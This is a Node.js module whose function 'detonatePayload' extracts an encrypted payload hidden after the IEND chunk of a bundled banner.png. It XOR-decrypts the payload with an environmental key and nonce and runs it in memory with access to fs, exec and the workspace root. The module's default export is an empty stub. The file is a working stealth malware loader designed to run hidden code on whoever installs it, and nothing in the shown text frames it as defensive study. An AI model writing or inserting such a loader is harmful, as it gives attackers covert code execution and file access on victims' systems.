const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

function detonatePayload(environmentalKey, workspaceRoot) {
    console.log('[*] Detonator initiated. Searching for payload in banner...');
    try {
        const bannerPath = path.join(__dirname, 'banner.png');
        if (!fs.existsSync(bannerPath)) {
            console.error('[-] FATAL: banner.png not found. Cannot detonate payload.');
            return;
        }
        const pngBuffer = fs.readFileSync(bannerPath);

        const iendMarker = Buffer.from([0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82]);
        const iendIndex = pngBuffer.lastIndexOf(iendMarker);

        if (iendIndex === -1) {
            console.error('[-] FATAL: IEND chunk marker not found in PNG. Payload is missing or corrupted.');
            return;
        }

        const combinedBuffer = pngBuffer.slice(iendIndex + 8);
        
        if (combinedBuffer.length < 17) {
            console.error('[-] FATAL: Payload buffer is too small to be valid.');
            return;
        }

        const nonce = combinedBuffer.slice(0, 16);
        const encryptedPayload = combinedBuffer.slice(16);
        console.log(`[*] Found payload. Nonce: ${nonce.toString('hex')}`);

        const decryptedPayload = Buffer.alloc(encryptedPayload.length);

        for (let i = 0; i < encryptedPayload.length; i++) {
            decryptedPayload[i] = encryptedPayload[i] ^ environmentalKey[i % environmentalKey.length] ^ nonce[i % nonce.length];
        }

        const payloadCode = decryptedPayload.toString('utf8');
        
        if (!payloadCode.trim().startsWith('const')) {
            console.error('[-] Decryption failed. Resulting code is not valid JavaScript. Halting execution.');
            return;
        }

        console.log('[+] Payload decrypted successfully using environmental key.');
        const payloadFunction = new Function('fs_arg', 'path_arg', 'exec_arg', 'workspaceRoot_arg', payloadCode);
        
        console.log('[!] Executing final payload in memory...');
        payloadFunction(fs, path, exec, workspaceRoot);

    } catch (e) {
        console.error(`[-] Payload detonation failed. Error: ${e.message}. This could be due to an incorrect key or corrupted payload.`);
    }
}

module.exports = () => {};

module.exports.detonatePayload = detonatePayload;
